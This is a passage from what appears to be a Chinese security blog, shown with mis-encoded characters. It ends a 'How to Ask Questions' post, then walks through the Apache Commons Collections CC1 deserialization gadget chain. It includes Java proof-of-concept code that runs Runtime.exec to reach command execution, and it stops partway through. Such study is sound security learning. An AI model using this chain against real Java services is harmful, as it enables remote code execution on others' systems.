¹æœ¬ä¸å¯èƒ½ç”±ä¸€ä¸ªäººæ¥å¤„ç†æ¥è‡ªä¸Šä¸‡åç”¨æˆ·çš„æ±‚åŠ©ç”µè¯ã€‚è¦çŸ¥é“ï¼Œå³ä½¿ä½ è¦ä¸ºè¿™äº›ååŠ©ä»˜è´¹ï¼Œå’Œä½ æ‰€è´­ä¹°çš„åŒç±»è½¯ä»¶ç›¸æ¯”ï¼Œä½ æ‰€ä»˜å‡ºçš„ä¹Ÿæ˜¯å¾®ä¸è¶³é“çš„ï¼ˆé€šå¸¸å°é—­æºä»£ç è½¯ä»¶çš„æŠ€æœ¯æ”¯æŒè´¹ç”¨æ¯”å¼€æºè½¯ä»¶çš„è¦é«˜å¾—å¤šï¼Œä¸”å†…å®¹ä¹Ÿæ²¡é‚£ä¹ˆä¸°å¯Œï¼‰ã€‚\nå¦‚ä½•æ›´å¥½åœ°å›ç­”é—®é¢˜ æ€åº¦å’Œå–„ä¸€ç‚¹ã€‚ é—®é¢˜å¸¦æ¥çš„å‹åŠ›å¸¸ä½¿äººæ˜¾å¾—æ— ç¤¼æˆ–æ„šè ¢ï¼Œå…¶å®å¹¶ä¸æ˜¯è¿™æ ·ã€‚\nå¯¹åˆçŠ¯è€…ç§ä¸‹å›å¤ã€‚ å¯¹é‚£äº›å¦è¯šçŠ¯é”™ä¹‹äººæ²¡æœ‰å¿…è¦å½“ä¼—ç¾è¾±ï¼Œä¸€ä¸ªçœŸæ­£çš„æ–°æ‰‹ä¹Ÿè®¸è¿æ€ä¹ˆæœç´¢æˆ–åœ¨å“ªæ‰¾å¸¸è§é—®é¢˜éƒ½ä¸çŸ¥é“ã€‚\nå¦‚æœä½ ä¸ç¡®å®šï¼Œä¸€å®šè¦è¯´å‡ºæ¥ï¼ ä¸€ä¸ªå¬èµ·æ¥æƒå¨çš„é”™è¯¯å›å¤æ¯”æ²¡æœ‰è¿˜è¦ç³Ÿï¼Œåˆ«å› ä¸ºå¬èµ·æ¥åƒä¸ªä¸“å®¶å¾ˆå¥½ç©ï¼Œå°±ç»™åˆ«äººä¹±æŒ‡è·¯ã€‚è¦è°¦è™šå’Œè¯šå®ï¼Œç»™æé—®è€…ä¸åŒè¡Œéƒ½æ ‘ä¸ªå¥½æ¦œæ ·ã€‚\nå¦‚æœå¸®ä¸äº†å¿™ï¼Œä¹Ÿåˆ«å¦¨ç¢ä»–ã€‚ ä¸è¦åœ¨å®é™…æ­¥éª¤ä¸Šå¼€ç©ç¬‘ï¼Œé‚£æ ·ä¹Ÿè®¸ä¼šæ¯äº†æé—®è€…çš„è®¾ç½® â€”â€” æœ‰äº›å¯æ€œçš„å‘†ç“œä¼šæŠŠå®ƒå½“æˆçœŸçš„æŒ‡ä»¤ã€‚\nè¯•æ¢æ€§çš„åé—®ä»¥å¼•å‡ºæ›´å¤šçš„ç»†èŠ‚ã€‚ å¦‚æœä½ åšå¾—å¥½ï¼Œæé—®è€…å¯ä»¥å­¦åˆ°ç‚¹ä¸œè¥¿ â€”â€” ä½ ä¹Ÿå¯ä»¥ã€‚è¯•è¯•å°†è ¢é—®é¢˜è½¬å˜æˆå¥½é—®é¢˜ï¼Œåˆ«å¿˜äº†æˆ‘ä»¬éƒ½æ›¾æ˜¯æ–°æ‰‹ã€‚\nå°½ç®¡å¯¹é‚£äº›æ‡’è™«æŠ±æ€¨ä¸€å£° RTFM æ˜¯æ­£å½“çš„ï¼Œä½†èƒ½ç»™å‡ºæ–‡æ¡£çš„é“¾æ¥ï¼ˆå³ä½¿åªæ˜¯å»ºè®®ä¸ª Google æœç´¢å…³é”®è¯ï¼‰ä¼šæ›´å¥½ã€‚\nå¦‚æœä½ å†³å®šå›ç­”ï¼Œå°±è¯·ç»™å‡ºå¥½çš„ç­”æ¡ˆã€‚ å½“åˆ«äººæ­£åœ¨ç”¨é”™è¯¯çš„å·¥å…·æˆ–æ–¹æ³•æ—¶åˆ«å»ºè®®ç¬¨æ‹™çš„æƒå®œä¹‹è®¡ï¼ˆworkaroundï¼‰ï¼Œåº”æ¨èæ›´å¥½çš„å·¥å…·ï¼Œé‡æ–°ç•Œå®šé—®é¢˜ã€‚\næ­£é¢åœ°å›ç­”é—®é¢˜ï¼ å¦‚æœè¿™ä¸ªæé—®è€…å·²ç»å¾ˆæ·±å…¥çš„ç ”ç©¶è€Œä¸”ä¹Ÿè¡¨æ˜å·²ç»è¯•è¿‡ X ã€ Y ã€ Z ã€ A ã€ B ã€ C ä½†æ²¡å¾—åˆ°ç»“æœï¼Œå›ç­” è¯•è¯•çœ‹ A æˆ–æ˜¯ B æˆ–è€… è¯•è¯• X ã€ Y ã€ Z ã€ A ã€ B ã€ C å¹¶é™„ä¸Šä¸€ä¸ªé“¾æ¥ä¸€ç‚¹ç”¨éƒ½æ²¡æœ‰ã€‚\nå¸®åŠ©ä½ çš„ç¤¾åŒºä»é—®é¢˜ä¸­å­¦ä¹ ã€‚ å½“å›å¤ä¸€ä¸ªå¥½é—®é¢˜æ—¶ï¼Œé—®é—®è‡ªå·±å¦‚ä½•ä¿®æ”¹ç›¸å…³æ–‡ä»¶æˆ–å¸¸è§é—®é¢˜æ–‡ä»¶ä»¥å…å†æ¬¡è§£ç­”åŒæ ·çš„é—®é¢˜ï¼Ÿï¼Œæ¥ç€å†å‘æ–‡ä»¶ç»´æŠ¤è€…å‘ä¸€ä»½è¡¥ä¸ã€‚\nå¦‚æœä½ åœ¨ç ”ç©¶ä¸€ç•ªåæ‰ä½œå‡ºäº†å›ç­”ï¼Œå±•ç°ä½ çš„æŠ€å·§è€Œä¸æ˜¯ç›´æ¥ç«¯å‡ºç»“æœã€‚æ¯•ç«Ÿæˆäººä»¥é±¼ä¸å¦‚æˆäººä»¥æ¸”ã€‚\nç›¸å…³èµ„æº å¦‚æœä½ éœ€è¦ä¸ªäººç”µè„‘ã€Unix ç³»ç»Ÿå’Œç½‘ç»œå¦‚ä½•è¿ä½œçš„åŸºç¡€çŸ¥è¯†ï¼Œå‚é˜… Unix ç³»ç»Ÿå’Œç½‘ç»œåŸºæœ¬åŸç†ã€‚\nå½“ä½ å‘å¸ƒè½¯ä»¶æˆ–è¡¥ä¸æ—¶ï¼Œè¯•ç€æŒ‰è½¯ä»¶å‘å¸ƒå®è·µæ“ä½œã€‚\né¸£è°¢ Evelyn Mitchel è´¡çŒ®äº†ä¸€äº›æ„šè ¢é—®é¢˜ä¾‹å­å¹¶å¯å‘äº†ç¼–å†™å¦‚ä½•æ›´å¥½åœ°å›ç­”é—®é¢˜è¿™ä¸€èŠ‚ï¼Œ Mikhail Ramendik è´¡çŒ®äº†ä¸€äº›ç‰¹åˆ«æœ‰ä»·å€¼çš„å»ºè®®å’Œæ”¹è¿›ã€‚\n","date":"2024-07-27T01:19:29+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240727012057978.png","permalink":"https://d4n-sec.github.io/p/how2ask/","title":"How to Ask Questions The Smart Way"},{"content":"å‡è®¾è¯»è€…å·²ç»æŒæ¡ï¼ˆç¬”è€…åšå®¢é‡Œçš„å‰ç½®æ–‡ç« å†…æ¶‰åŠæŠ€æœ¯çš„ï¼‰åŸºç¡€çŸ¥è¯†\næœ¬æ–‡ç« ç›®çš„æ˜¯åˆ†æCCé“¾ä¹‹1 Demoï¼Œä»¥åŠè¡¥å……ç›¸å…³å‰ç½®çŸ¥è¯†ï¼Œå¹¶å°è¯•è§£å†³CC1é“¾å¿…è¦æ€§é—®é¢˜ï¼Œå³CC1çš„å¿…è¦è·¯å¾„å’Œå¯é€‰è·¯å¾„\nç¬”è€…çš„æ€ç»´è·¯å¾„ä¸ºæ·±åº¦ä¼˜å…ˆä¸ºä¸»ï¼Œå¹¿åº¦ä¸ºè¾…çš„Mindsetï¼Œå¦‚æœç†è§£ç›¸å…³çŸ¥è¯†ç‚¹ï¼Œå¯è·³è¿‡æŸäº›å°ç« èŠ‚ä»¥æå‡é˜…è¯»æ•ˆç‡ã€‚\nCCé“¾1 Demo ç®€æ˜“ä¾‹å­ é¦–å…ˆæ¥ä¸€ä¸ªä½¬çš„æœ€ç®€åŒ–CCé“¾\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class CommonC1dm { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[] {\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } } å…¶ä¸­æ²¡è§è¿‡ transformer ï¼ŒTransformedMap\næ¥ä¸‹æ¥å°è¯•ç†è§£ä»–ä»¬çš„è®¾è®¡ç†å¿µä¸æ„å›¾\nTransformer ç›´è¯‘ï¼šå˜å½¢ç”Ÿæˆå™¨\nJavaä¸­çš„Transformerï¼šæ˜¯ä¸€ä¸ªåœ¨org.apache.commons.collections.Transformeré‡Œçš„æ¥å£\næºç \n1 2 3 public interface Transformer { public Object transform(Object input); } ç›¸å…³æ¥å£å¿…é¡»å®ç°transformæ–¹æ³•\nä½œç”¨ï¼šä»IDEAçš„æ³¨é‡Šä¸­å¯ä»¥äº†è§£åˆ° å°†è¾“å…¥å¯¹è±¡ï¼ˆä¿æŒä¸å˜ï¼‰è½¬æ¢ä¸ºæŸä¸ªè¾“å‡ºå¯¹è±¡\nè¾“å…¥è¾“å‡º å‚æ•°ï¼šè¾“å…¥è¦è½¬æ¢çš„å¯¹è±¡ï¼Œåº”ä¿æŒä¸å˜\nè¿”å›å€¼ï¼šå˜æ¢åçš„å¯¹è±¡\nå¼‚å¸¸å¤„ç† å¦‚æœè¾“å…¥æ˜¯é”™è¯¯çš„ç±»ï¼ŒæŠ›å‡º ClassCastExceptionï¼ˆè¿è¡Œæ—¶ï¼‰é”™è¯¯ å¦‚æœè¾“å…¥æ— æ•ˆï¼ŒæŠ›å‡º IllegalArgumentExceptionï¼ˆè¿è¡Œæ—¶ï¼‰é”™è¯¯ å¦‚æœæ— æ³•å®Œæˆè½¬æ¢ï¼ŒæŠ›å‡º FunctorExceptionï¼ˆè¿è¡Œæ—¶ï¼‰é”™è¯¯ ç»“åˆè¾“å…¥è¾“å‡ºä»¥åŠæ³¨é‡Šè§£é‡Šï¼Œæˆ‘ä»¬å¯ä»¥æœ‰ä¸€ä¸ªåŸºæœ¬çš„æ¦‚å¿µ\nTransformer å·®ä¸å¤šåº”è¯¥æ˜¯ä¸€ä¸ªè½¬æ¢å™¨æ¥å£ï¼Œè€Œä¸”æ˜¯ç”¨æ¥è½¬æ¢å¯¹è±¡ç”¨çš„\nå¦‚ä¸‹æ˜¯å®ç°äº†è¯¥æ¥å£çš„ç›¸å…³ç±»\næˆ‘ä»¬å¯ä»¥å°è¯•æŸ¥çœ‹å‡ ä¸ªç›¸å…³ç±»å¯¹äºtransformæ–¹æ³•çš„å…·ä½“å®ç°ï¼ˆä¹Ÿæ˜¯ä¹‹åå¯èƒ½ä¼šç”¨åˆ°çš„Transformerå®ç°ç±»ï¼‰\nInvokerTransformer ç±»ç»“æ„ æºç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public Object transform(Object input) { ... Class cls = input.getClass(); //è·å–inputçš„Classå¯¹è±¡ Method method = cls.getMethod(iMethodName, iParamTypes); //æ ¹æ®Str:iMethodName å’Œ ä¸€ç³»åˆ—ç±»å‹ï¼Œç¡®å®šå”¯ä¸€çš„ Method //iMethodNameç¡®å®šMethodåç§°ï¼ŒiParamTypesç¡®å®šMethodå‚æ•°ç±»å‹ //å¦‚æ­¤è®¾è®¡æ˜¯ä¸ºäº†é˜²æ­¢Methodé‡è½½ return method.invoke(input, iArgs); //æ‰§è¡Œinputç±»ä¸­åä¸º$iMethodNameçš„æ–¹æ³•ï¼Œä¼ å…¥å‚æ•°$iArgs ... } æ ¸å¿ƒä»£ç å°±ä¸‰è¡Œï¼ŒåŠŸèƒ½å·²ç»æ³¨é‡Šå‡ºæ¥ï¼Œå…¶ä¸­$iArgsï¼Œ$iParamTypesï¼Œ$iParamTypesåœ¨InvokerTransformerç±»å¯¹è±¡åˆ›å»ºçš„æ—¶å€™ç¡®å®š\nåˆ©ç”¨è§’åº¦ æ‰€ä»¥å¦‚æœè¦è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œè¾¾åˆ°Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;);çš„æ•ˆæœçš„è¯ï¼Œè½¬æ¢ä¸ºInvokerTransformerä¸­transformæ–¹æ³•çš„ä½¿ç”¨æ–¹å¼æ˜¯\n1 2 3 4 5 6 7 8 9 public static void main(String[] args) throws Exception { // Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); InvokerTransformer invokerTransformer = new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new String[]{\u0026#34;calc\u0026#34;} ); invokerTransformer.transform(Runtime.getRuntime()); } MapTransformer ç±»ç»“æ„ æºç  1 2 3 4 public Object transform(Object input) { return iMap.get(input); //ä»$iMapä¸­æ‹¿å‡ºkeyå€¼ä¸º$inputçš„value } åˆ©ç”¨è§’åº¦ é€šè¿‡ä¾‹å­äº†è§£åŸç†å³å¯ï¼Œå®é™…ä½¿ç”¨ä¼šç»“åˆå…¶ä»–Gadgetä½¿ç”¨\n1 2 3 4 5 6 7 8 public static void main(String[] args) throws Exception { // Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); HashMap\u0026lt;String,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;key\u0026#34;,Runtime.getRuntime()); Transformer transform = MapTransformer.getInstance(map); Runtime runtime = (Runtime) transform.transform(\u0026#34;key\u0026#34;); runtime.exec(\u0026#34;calc\u0026#34;); } ConstantTransformer ç±»ç»“æ„ æºç  1 2 3 4 public Object transform(Object input) { return iConstant; //ä¸ç®¡è¾“å…¥ï¼Œç›´æ¥è¿”å›å¯¹è±¡åˆå§‹åŒ–æ—¶ç¡®å®šçš„å€¼ } åˆ©ç”¨è§’åº¦ æ²¡ä»€ä¹ˆåˆ©ç”¨è§’åº¦ï¼Œå¸¸æ•°è®¾ç½®å™¨ä¸€æ ·çš„ï¼Œå¯èƒ½å¯¹ç»•è¿‡æœ‰å¸®åŠ©ï¼Ÿ\nChainedTransformer ç±»ç»“æ„ æºç  1 2 3 4 5 6 7 8 9 10 11 public Object transform(Object object) { for (int i = 0; i \u0026lt; iTransformers.length; i++) { //å› ä¸º$iTransformersæ˜¯ä¸€ä¸ªListï¼Œæ‰€ä»¥å¾ªç¯éå†æ‰€æœ‰$iTransformersä¸­çš„iTransformer object = iTransformers[i].transform(object); //æ¯ä¸€ä¸ªiTransformeréƒ½è¦è¿è¡ŒiTransformerè‡ªèº«çš„transformæ–¹æ³• //å¹¶æŠŠç»“æœä¿å­˜åˆ°objectä¸­ï¼Œä¸”objectæ˜¯ä¸‹ä¸ªiTransformer.transformæ–¹æ³•çš„å‚æ•° } return object; //è¿”å›æœ€åä¸€ä¸ªobject } åˆ©ç”¨è§’åº¦ ChainedTransformerçš„transformæ–¹æ³•å®ç°å¾ˆåç›´è§‰ï¼Œæ‰€ä»¥å…¶è®¾è®¡ç¼˜ç”±å€¼å¾—æ€è€ƒï¼Œä½†ç›®å‰æ²¡æ‰¾åˆ°ç›¸å…³å‚è€ƒèµ„æ–™ï¼ŒæŒ‰ç…§IDEAä¸­çš„æ³¨é‡Šå¯ä»¥è§£é‡Šä¸ºï¼š\nFactory method that performs validation and copies the parameter array.\nä¸€ä¸ªå·¥å‚æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥éªŒè¯å’Œæ‹·è´å‚æ•°æ•°ç»„ \u0026mdash; ï¼ˆä¸­çš„å†…å®¹ï¼Ÿï¼‰\næ­¤ç±»çš„åˆ©ç”¨è§’åº¦å·²ç»æ›å…‰å¤šå¹´ï¼Œä¸è¿‡ç°åœ¨çœ‹æ¥è¿˜æ˜¯ä¸å¾—ä¸æ„Ÿå¹å®‰å…¨ç ”ç©¶å‘˜çš„æ€ç»´æ•é”ç¨‹åº¦\nå¦‚ä¸‹æ˜¯ç®€å•ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public static void main(String[] args) throws Exception { // Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); Transformer chainedTransformer = new ChainedTransformer( new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;} ), } ); chainedTransformer.transform(Runtime.class); } æµç¨‹ç¤ºæ„å›¾ ChainedTransformerä¹Ÿæ˜¯å®ç°äº†Transformeræ¥â¼çš„â¼€ä¸ªç±»ï¼Œå®ƒçš„ä½œâ½¤æ˜¯å°†å†…éƒ¨çš„å¤šä¸ªTransformerä¸²\nåœ¨â¼€èµ·ã€‚é€šä¿—æ¥è¯´å°±æ˜¯ï¼Œå‰â¼€ä¸ªå›è°ƒè¿”å›çš„ç»“æœï¼Œä½œä¸ºåâ¼€ä¸ªå›è°ƒçš„å‚æ•°ä¼ â¼Šã€‚\nTransformedMap ç±»ç»“æ„ ç”±ç»“æ„å¯çŸ¥ï¼Œè¯¥ç±»åªå¼€æ”¾äº†ä¸‰ä¸ªæ–¹æ³•ä¾›å¤–ç•Œä½¿ç”¨putï¼ŒputAllï¼Œdecorate\nTransformedMap.decorate 1 2 3 public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } æ„é€ å‡½æ•°çš„å¼€æ”¾æ–¹æ³•\nTransformedMap.put \u0026amp; TransformedMap.putall put\n1 2 3 4 5 public Object put(Object key, Object value) { key = transformKey(key); value = transformValue(value); return getMap().put(key, value); } å¯ä»¥çœ‹åˆ°æ”¾å…¥keyå’Œvalueçš„æ—¶å€™ä¼šä½¿ç”¨transformKey,transformValueå¯¹Keyå’ŒValueè¿›è¡Œå¤„ç†\nputall\n1 2 3 4 public void putAll(Map mapToCopy) { mapToCopy = transformMap(mapToCopy); getMap().putAll(mapToCopy); } å…¶transformMapæºç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 protected Map transformMap(Map map) { Map result = new LinkedMap(map.size()); for (Iterator it = map.entrySet().iterator(); it.hasNext(); ) { Map.Entry entry = (Map.Entry) it.next(); result.put( transformKey(entry.getKey()), transformValue(entry.getValue()) ); } return result; } å¯ä»¥çœ‹åˆ°æœ¬è´¨è¿˜æ˜¯ä½¿ç”¨è¿™ä¸¤ä¸ªå‡½æ•°è¿›è¡Œå¤„ç†transformKey,transformValue\n1 2 3 4 5 6 7 8 9 10 11 12 13 protected Object transformKey(Object object) { if (keyTransformer == null) { return object; } return keyTransformer.transform(object); } protected Object transformValue(Object object) { if (valueTransformer == null) { return object; } return valueTransformer.transform(object); } ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°transformKey,transformValueåªæ˜¯å•çº¯è°ƒç”¨transformæ–¹æ³•ç½¢äº†\næ•´ç†ä¸‹æ¥ï¼ŒTransformedMapåšäº†ä»€ä¹ˆäº‹å„¿ï¼Ÿ\nTransformedMapè¿™ä¸ªç±»æ„é€ å¯¹è±¡æ—¶ï¼Œä¼šä¼ å…¥Map map, Transformer keyTransformer, Transformer valueTransformer\næ„é€ å¥½åï¼Œå†å‘å¯¹è±¡ä¸­put Key Valueæ—¶ï¼Œä¼šä½¿ç”¨åŸå…ˆé…ç½®å¥½çš„key/valueTransformerå¯¹key/valueåˆ†åˆ«è¿›è¡Œå¤„ç†ï¼Œå°†å¤„ç†åçš„key/valueå€¼æ”¾å…¥mapä¸­\nå¦‚å¤§ä½¬æ‰€è¯´\nTransformedMapâ½¤äºå¯¹Javaæ ‡å‡†æ•°æ®ç»“æ„Mapåšâ¼€ä¸ªä¿®é¥°ï¼Œè¢«ä¿®é¥°è¿‡çš„Mapåœ¨æ·»åŠ æ–°çš„å…ƒç´ æ—¶ï¼Œå°†å¯\nä»¥æ‰§â¾â¼€ä¸ªå›è°ƒã€‚\nTransformedMapæ˜¯Mapçš„åŠŸèƒ½æ‰©å±•ç±»ï¼ï¼\nç®€æ˜“ä¾‹å­çš„ç†è§£ å›åˆ°å¤§ä½¬çš„ç®€æ˜“ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class CommonC1dm { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[] {\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } } é¦–å…ˆ1-10é…ç½®ChainedTransformerï¼Œä»¥æ­¤æ”¾å¥½è§¦å‘çš„æœ€ç»ˆæ‰§è¡Œç¯å¢ƒ\n11-13é…ç½®TransformedMapï¼Œä»¥æ­¤è§¦å‘ChainedTransformerï¼Œ\n14 æ”¾å…¥æ•°æ®ï¼Œè§¦å‘TransformedMapæœºåˆ¶ã€‚\nå®Œæ•´POCçš„å¼€ç«¯ ä¸è¿‡å¦‚æœåªæ˜¯åˆ°è¿™é‡Œçš„è¯ï¼Œæ²¡æ³•å½¢æˆå®Œæ•´çš„åˆ©ç”¨é“¾è·¯ï¼Œç›®å‰æˆ‘ä»¬çš„çŸ¥è¯†ç‚¹èƒ½ç©¿èµ·æ¥çš„çº¿è·¯å¦‚ä¸‹\nreadObject() \u0026mdash;\u0026gt; \u0026hellip;\u0026hellip;. \u0026mdash;\u0026gt; HashMap \u0026mdash;\u0026gt; TransformedMap \u0026mdash;\u0026gt; ChainedTransformer \u0026mdash;\u0026gt; RCE\nä»ååºåˆ—åŒ–å…¥å£ï¼Œåˆ°RCEçš„é“¾è·¯ä¸å®Œæ•´ï¼Œå€Ÿç”¨ä½¬çš„è¯\næˆ‘ä»¬å‰é¢è¯´è¿‡ï¼Œè§¦å‘è¿™ä¸ªæ¼æ´çš„æ ¸å¿ƒï¼Œåœ¨äºæˆ‘ä»¬éœ€è¦å‘Mapä¸­åŠ å…¥ä¸€ä¸ªæ–°çš„å…ƒç´ ã€‚åœ¨demoä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹å·¥æ‰§è¡Œ outerMap.put(\u0026ldquo;test\u0026rdquo;, \u0026ldquo;xxxx\u0026rdquo;); æ¥è§¦å‘æ¼æ´ï¼Œä½†åœ¨å®é™…ååºåˆ—åŒ–æ—¶ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»ï¼Œå®ƒåœ¨ååºåˆ—åŒ–çš„readObjecté€»è¾‘é‡Œæœ‰ç±»ä¼¼çš„å†™å…¥æ“ä½œã€‚è¿™ä¸ªç±»å°±æ˜¯sun.reflect.annotation.AnnotationInvocationHandler\nAnnotationå³æ³¨è§£ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œå¼€å‘è€…æ˜¯ä½¿ç”¨Annotationè€Œä¸æ˜¯ç¼–å†™Annotationï¼Œæ‰€ä»¥æš‚æ—¶ä¸åšå±•å¼€å­¦ä¹ \nAnnotationInvocationHandler.readObjectçš„æºç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class\u0026lt;?\u0026gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \u0026#34;[\u0026#34; + value + \u0026#34;]\u0026#34;).setMember( annotationType.members().get(name))); } } } } } å…¶ä¸­è§¦å‘è¯­å¥æ˜¯26è¡Œçš„memberValue.setValue()ï¼Œæ­¤æ—¶çš„memberValueä¸ºAbstractInputCheckedMapDecoratorç±»çš„é™æ€å†…éƒ¨ç±»MapEntry,æ­¤ç±»çš„æºç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 static class MapEntry extends AbstractMapEntryDecorator { /** The parent map */ private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) { super(entry); this.parent = parent; } public Object setValue(Object value) { value = parent.checkSetValue(value); return entry.setValue(value); } } setValue()ä¼šè°ƒç”¨parent.checkSetValue()ï¼Œç”±ä¸Šæ–¹ç¬¬4è¡Œå¯çŸ¥parentä¸ºAbstractInputCheckedMapDecoratorç±»ï¼Œå³çˆ¶ç±»\næ‰€ä»¥setValue()ä¼šè°ƒç”¨AbstractInputCheckedMapDecoratorç±»çš„checkSetValue()æ–¹æ³•\nåˆåˆšå¥½ï¼ŒTransformedMapæ˜¯AbstractInputCheckedMapDecoratorçš„æŠ½è±¡ç±»å®ç°ï¼Œå®ç°äº†æŠ½è±¡æ–¹æ³•checkSetValue()\næœ‰è¶£çš„æ˜¯ï¼ŒTransformedMap.checkSetValue()åªåœ¨ä¸Šæ–¹æåˆ°çš„å†…éƒ¨é™æ€ç±»AbstractInputCheckedMapDecorator.MapEntryä¸­è¢«è°ƒç”¨è¿‡\nTransformedMap.checkSetValue()çš„æºç å¦‚ä¸‹\n1 2 3 protected Object checkSetValue(Object value) { return valueTransformer.transform(value); } ä¼šè°ƒç”¨valueTransformer.transform()ï¼Œè€ŒvalueTransformeråœ¨ç®€å•ä¾‹å­ä¸­çš„ç¬¬12è¡Œå·²ç»è¢«è®¾ç½®ä¸ºè§¦å‘RCEçš„transformersäº†\næ‰€ä»¥ï¼ï¼ï¼ï¼ï¼AbstractInputCheckedMapDecorator.MapEntry.parentè¢«è®¾ç½®ä¸ºTransformedMapå³å¯è¡¥é½é“¾æ¡ï¼Œå¦‚ä¸‹æ˜¯è°ƒç”¨æ ˆã€‚\n1 2 3 4 ChainedTransformer.transform() TransformedMap.checkSetValue() AbstractInputCheckedMapDecorator$MapEntry.setValue() AnnotationInvocationHandler.readObject() å½“ChainedTransformer.transform()è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œå³å¯RCE\nå…ˆå…¥ä¸ºä¸»çš„è§£é‡Š åˆå­¦è€…çš„å­¦ä¹ é˜¶æ®µåªéœ€è¦ç†è§£è¿™æ ·åšä¸ºä»€ä¹ˆå¯è¡Œï¼Œè€Œæš‚æ—¶æç½®ä¸ºä»€ä¹ˆä¸€å®š/éœ€è¦è¿™æ ·åšçš„åŸå› \nAbstractInputCheckedMapDecorator.MapEntry.parentå¦‚ä½•è¢«è®¾ç½®ä¸ºTransformedMapçš„å‘¢ï¼Ÿ\nmemberValuesæ¥æºäºè¯¥ç±»çš„æ„é€ å‡½æ•°ï¼Œæ„é€ å‡½æ•°ä¸ºå£°æ˜ä¸º 1 AnnotationInvocationHandler(Class\u0026lt;? extends Annotation\u0026gt; type, Map\u0026lt;String, Object\u0026gt; memberValues) æ‰€ä»¥memberValuesæ˜¯ä¸€ä¸ªå®ç°äº†Mapæ¥å£çš„ç±»ï¼Œæˆ‘ä»¬è®¾ç½®çš„outerMapå®Œç¾ç¬¦åˆè¿™ä¸ªè¦æ±‚\nç›´æ¥ä½¿ç”¨æ„é€ å‡½æ•°å°†outerMapä¼ é€’ç»™memberValueså³å¯\nAnnotationInvocationHandler.readObject()ä¸­å°†memberValues.entrySet()çš„ç»“æœå½“åšè¿­ä»£å™¨è®¿é—®ï¼Œå¦‚ä¸‹ 1 for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()) æ­¤æ—¶memberValues.entrySet()ä¼šè¿”å›å†…éƒ¨ç±»AbstractInputCheckedMapDecorator.EntrySetï¼Œå¦‚ä¸‹\n1 2 3 4 5 public Set entrySet() { ... return new EntrySet(map.entrySet(), this); ... } å¯¹å†…éƒ¨ç±»AbstractInputCheckedMapDecorator.EntrySetå½“åšè¿­ä»£å™¨è®¿é—®æ—¶ï¼Œä¼šè§¦å‘memberValues.iterator()è¿”å›è¿­ä»£å™¨ï¼ŒAbstractInputCheckedMapDecorator.EntrySet.iterator()æºç å¦‚ä¸‹\n1 2 3 public Iterator iterator() { return new EntrySetIterator(collection.iterator(), parent); } å®é™…ä¸Šæ¯æ¬¡è¿”å›çš„è¿­ä»£å™¨æ˜¯å†…éƒ¨ç±»AbstractInputCheckedMapDecorator.EntrySetIteratorï¼Œæ¯æ¬¡è¿­ä»£å™¨è¢«è®¿é—®æ—¶ä¼šè®¿é—®next()ï¼ŒAbstractInputCheckedMapDecorator.EntrySetIterator.next()æºç å¦‚ä¸‹\n1 2 3 4 